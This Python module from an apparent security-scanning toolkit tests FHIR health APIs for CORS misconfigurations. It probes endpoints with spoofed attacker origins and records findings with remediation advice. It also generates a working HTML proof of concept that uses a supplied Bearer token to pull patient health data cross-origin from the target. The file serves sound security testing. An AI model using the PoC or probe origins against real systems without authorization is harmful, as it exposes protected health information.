"""Comprehensive CORS testing + PoC generator.

Tests origin-handling variants and generates a working HTML PoC that
demonstrates cross-origin exfiltration when a token is supplied.

Pattern discovered on CMS BB2:
  Access-Control-Allow-Origin: *
  Access-Control-Allow-Headers: accept, authorization, content-type, ...
  → any origin can exfiltrate PHI when given a Bearer token
"""

from __future__ import annotations

import html
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

import httpx
from rich.console import Console

from fhirbug.core.client import FHIRClient
from fhirbug.core.models import (
    Finding,
    FindingCategory,
    ScanResult,
    Severity,
)

console = Console()


@dataclass
class CORSResult:
    origin: str
    status_code: int
    acao: str                # Access-Control-Allow-Origin
    acac: str                # Access-Control-Allow-Credentials
    acah: str                # Access-Control-Allow-Headers
    acam: str                # Access-Control-Allow-Methods
    allows_authorization: bool = False
    allows_credentials: bool = False
    reflects_origin: bool = False


# Origins we test — includes attack variants
PROBE_ORIGINS = [
    "https://evil.example.com",
    "null",
    "file://",
    "https://attacker.com",
    # Subdomain confusion tricks (attacker attempting to spoof trust)
    "https://bluebutton.cms.gov.evil.com",
    "https://evil.cms.gov",
]


async def probe_cors(
    client: FHIRClient, url: str, origin: str
) -> CORSResult:
    """Probe a URL with a given Origin and capture CORS response headers."""
    # Preflight OPTIONS first
    try:
        r_options = await client.request(
            "OPTIONS", url,
            headers={
                "Origin": origin,
                "Access-Control-Request-Method": "GET",
                "Access-Control-Request-Headers": "Authorization, Content-Type",
            },
        )

        # Follow up with an actual GET (with the origin header)
        r_get = await client.get(url, headers={"Origin": origin})

        # Merge headers (preflight tells us what's allowed, actual response confirms)
        acao = r_options.headers.get("access-control-allow-origin", "") or r_get.headers.get("access-control-allow-origin", "")
        acac = r_options.headers.get("access-control-allow-credentials", "") or r_get.headers.get("access-control-allow-credentials", "")
        acah = r_options.headers.get("access-control-allow-headers", "") or r_get.headers.get("access-control-allow-headers", "")
        acam = r_options.headers.get("access-control-allow-methods", "") or r_get.headers.get("access-control-allow-methods", "")

        return CORSResult(
            origin=origin,
            status_code=r_get.status_code,
            acao=acao,
            acac=acac,
            acah=acah,
            acam=acam,
            allows_authorization="authorization" in acah.lower(),
            allows_credentials=acac.lower() == "true",
            # Reflection requires (a) ACAO actually present and
            # (b) ACAO byte-equal to the Origin we sent. Without (a) the
            # server simply isn't doing CORS for this request and we should
            # not flag it as reflecting.
            reflects_origin=(bool(acao) and acao == origin),
        )
    except httpx.HTTPError as e:
        return CORSResult(
            origin=origin, status_code=0,
            acao="", acac="", acah="", acam="",
        )


def generate_cors_poc(
    target_url: str,
    base_origin: str = "http://localhost:8080",
) -> str:
    """Generate a working HTML PoC for cross-origin exfiltration."""
    target_host = target_url.split("/")[2] if "//" in target_url else target_url

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>CORS PHI Exfiltration PoC — {html.escape(target_host)}</title>
<style>
  body {{ font-family: -apple-system, sans-serif; max-width: 800px; margin: 40px auto;
         padding: 20px; background: #1e293b; color: #e2e8f0; }}
  h1 {{ color: #fca5a5; border-bottom: 2px solid #475569; padding-bottom: 10px; }}
  .warning {{ background: #7f1d1d; padding: 12px; border-radius: 4px; margin: 16px 0; }}
  input, button {{ font-size: 14px; padding: 8px; margin: 4px 0; }}
  input {{ width: 600px; background: #0f172a; color: #fee; border: 1px solid #475569; }}
  button {{ background: #dc2626; color: white; border: none; cursor: pointer; padding: 10px 20px; }}
  pre {{ background: #0f172a; padding: 12px; border-radius: 4px; overflow-x: auto;
        font-size: 12px; max-height: 400px; }}
  .success {{ color: #86efac; }}
  .error {{ color: #fca5a5; }}
</style>
</head>
<body>

<h1>CORS PHI Exfiltration PoC</h1>

<div class="warning">
  <strong>Authorized security testing only.</strong><br>
  Target: <code>{html.escape(target_url)}</code><br>
  Demonstrating cross-origin data exfiltration when served from an untrusted origin.
</div>

<h2>Step 1: Paste a Bearer token</h2>
<p>Obtain a valid token for the target via the normal OAuth flow.</p>
<input type="text" id="token" placeholder="Bearer token" />

<h2>Step 2: Trigger cross-origin fetch</h2>
<button onclick="exfil()">Exfiltrate</button>

<h2>Result</h2>
<div>Origin: <span id="origin-val"></span></div>
<pre id="output">No results yet.</pre>

<script>
document.getElementById('origin-val').textContent = window.location.origin || 'null (file:// or sandboxed)';

async function exfil() {{
  const token = document.getElementById('token').value.trim();
  const out = document.getElementById('output');

  if (!token) {{
    out.innerHTML = '<span class="error">No token supplied.</span>';
    return;
  }}

  const url = '{target_url}';
  out.textContent = `Fetching ${{url}} from ${{window.location.origin}}...`;

  try {{
    const r = await fetch(url, {{
      method: 'GET',
      headers: {{
        'Authorization': `Bearer ${{token}}`,
        'Accept': 'application/fhir+json'
      }},
    }});

    const text = await r.text();
    if (r.ok) {{
      out.innerHTML = `<span class="success">EXFIL SUCCESSFUL — ${{r.status}}</span>\\n\\n` + text;
    }} else {{
      out.innerHTML = `<span class="error">${{r.status}} ${{r.statusText}}</span>\\n\\n${{text}}`;
    }}
  }} catch (e) {{
    out.innerHTML = `<span class="error">Fetch failed: ${{e.message}}</span>`;
  }}
}}
</script>
</body>
</html>
"""


async def run_cors_scan(
    client: FHIRClient,
    result: ScanResult,
    urls_to_test: list[str],
    generate_poc: bool = True,
    poc_output_dir: str = "findings",
) -> None:
    """Run CORS probes against target URLs, report findings, optionally generate PoC."""
    console.print("\n[bold]Running CORS tests...[/]")

    for url in urls_to_test:
        console.print(f"\n  [cyan]Target:[/] {url}")

        all_results: list[CORSResult] = []
        for origin in PROBE_ORIGINS:
            res = await probe_cors(client, url, origin)
            all_results.append(res)
            console.print(
                f"    Origin={origin}: ACAO={res.acao or '-'} "
                f"ACAH={'auth' if res.allows_authorization else '-'} "
                f"ACAC={res.acac or '-'}"
            )

        # Analyze — did ANY origin get an allow?
        wildcard_results = [r for r in all_results if r.acao == "*"]
        reflected_results = [r for r in all_results if r.reflects_origin]

        if wildcard_results and any(r.allows_authorization for r in wildcard_results):
            # The BB2 pattern: wildcard + Authorization header allowed
            result.add_finding(Finding(
                title="CORS wildcard (*) with Authorization header allowed — PHI exfil possible",
                severity=Severity.HIGH,
                category=FindingCategory.CONFIG,
                description=(
                    "The server returns Access-Control-Allow-Origin: * and permits the "
                    "Authorization header in Access-Control-Allow-Headers. This allows any "
                    "web origin to read PHI cross-origin when it has access to a Bearer "
                    "token (via XSS, malicious apps, browser extensions, leaked logs, etc.). "
                    "\n\nThe CORS spec blocks wildcard + credentials, but Bearer tokens in "
                    "the Authorization header are NOT subject to that restriction."
                ),
                endpoint=url,
                evidence={
                    "ACAO": wildcard_results[0].acao,
                    "ACAH": wildcard_results[0].acah,
                    "ACAC": wildcard_results[0].acac,
                    "probed_origins": [r.origin for r in all_results],
                },
                remediation=(
                    "Configure ACAO to a whitelist of trusted registered third-party "
                    "application origins. Never use wildcard (*) on an API that serves "
                    "authenticated PHI."
                ),
            ))

            if generate_poc:
                poc_html = generate_cors_poc(url)
                poc_path = Path(poc_output_dir) / "cors_poc.html"
                poc_path.parent.mkdir(parents=True, exist_ok=True)
                poc_path.write_text(poc_html)
                console.print(
                    f"    [green]PoC written to:[/] {poc_path}"
                )

        elif reflected_results and any(r.allows_credentials for r in reflected_results):
            # Origin reflection + credentials allowed — classic CORS misconfiguration.
            # Capture the actual ACAO/ACAC headers per probe so reviewers can
            # verify the finding without re-running the toolkit.
            reflected_with_creds = [
                r for r in reflected_results if r.allows_credentials
            ]
            result.add_finding(Finding(
                title="CORS reflects arbitrary origin + allows credentials",
                severity=Severity.CRITICAL,
                category=FindingCategory.CONFIG,
                description=(
                    "The server reflects the Origin header value back in "
                    "Access-Control-Allow-Origin AND sets Access-Control-Allow-Credentials: "
                    "true. This is the classic CORS misconfiguration allowing full "
                    "cross-origin CSRF with cookies."
                ),
                endpoint=url,
                evidence={
                    "reflected_probes": [
                        {
                            "origin_sent": r.origin,
                            "acao_returned": r.acao,
                            "acac_returned": r.acac,
                            "acah_returned": r.acah,
                            "status_code": r.status_code,
                        }
                        for r in reflected_with_creds
                    ],
                },
            ))
